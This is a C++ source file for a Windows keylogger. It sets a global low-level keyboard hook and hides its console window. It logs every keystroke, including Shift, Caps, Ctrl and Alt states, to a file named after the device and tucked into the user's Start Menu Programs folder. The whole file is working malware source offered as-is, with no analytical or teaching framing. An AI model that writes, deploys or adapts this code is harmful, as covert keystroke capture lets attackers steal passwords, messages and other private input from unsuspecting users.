#include <windows.h>
#include <iostream>
#include <fstream>
#include <map>

using namespace std;

HHOOK keyboardHook;
map<int, bool> keyStates; // Track key states to prevent repeats
int cnt = 0;

string getDeviceName() {
    char computerName[100];
    DWORD size = 101;
    if (GetComputerNameA(computerName, &size)) {
        return string(computerName);
    }
    return "unknown_device";
}

string logFilePath = "C:\\Users\\PCM\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\" + getDeviceName() + ".log";
ofstream log(logFilePath, ios::app);

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        cnt++;
        KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;
        int keyCode = kbStruct->vkCode;
        bool capsLockOn = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
        bool shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
        bool isUpperCase = capsLockOn ^ shiftPressed;

        if (wParam == WM_KEYDOWN) {
            if (!keyStates[keyCode]) {  // Only log once per press
                keyStates[keyCode] = true;

                switch (keyCode) {
                    case VK_BACK: log << "[Backspace]"; break;
                    case VK_TAB: log << "[Tab]"; break;
                    case VK_ESCAPE: log << "[Esc]"; break;
                    case 160: log << "[Shift]"; break;
                    case 20: log << "[Caps]"; break;
                    // case VK_LMENU: log << "[LAlt Pressed]"; break;
                    case VK_RMENU: log << "[RAlt Pressed]"; break;
                    case VK_RETURN: log << "[Enter]"; break;
                    case VK_LEFT: log << "[Left]"; break;
                    case VK_UP: log << "[Up]"; break;
                    case VK_RIGHT: log << "[Right]"; break;
                    case VK_DOWN: log << "[Down]"; break;
                    case 91: log << "[Win]"; break;
                    case 46: log << "[Del]"; break;

                    case VK_LCONTROL:
                        log << "[L-Ctrl Pressed]";
                        break;
                    case VK_RCONTROL:
                        log << "[R-Ctrl Pressed]";
                        break;

                    case VK_LMENU:
                        log << "[L-Alt Pressed]";
                        break;

                    default:
                        if (isprint(MapVirtualKey(keyCode, MAPVK_VK_TO_CHAR))) {
                            char key = (char)MapVirtualKey(keyCode, MAPVK_VK_TO_CHAR);
                            log << (isUpperCase ? (char)toupper(key) : (char)tolower(key));
                        } else {
                            log << "[" << keyCode << "]";
                        }
                }

                log.flush();
            }
        } else if (wParam == WM_KEYUP) {
            keyStates[keyCode] = false; // Reset key state on release

            if (keyCode == VK_LCONTROL) {
                log << "[L-Ctrl Released]";
            } else if (keyCode == VK_RCONTROL) {
                log << "[R-Ctrl Released]";
            } else if (keyCode == VK_LMENU) {
                log << "[LAlt Released]";
            } else if (keyCode == VK_RMENU) {
                log << "[RAlt Released]";
            }

            log.flush();
        }
        if (cnt == 30) {
            log << '\n';
        }
    }

    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

int main() {
    log << "\n[Keylogger started]\n";
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(keyboardHook);
    log.close();
    return 0;
}
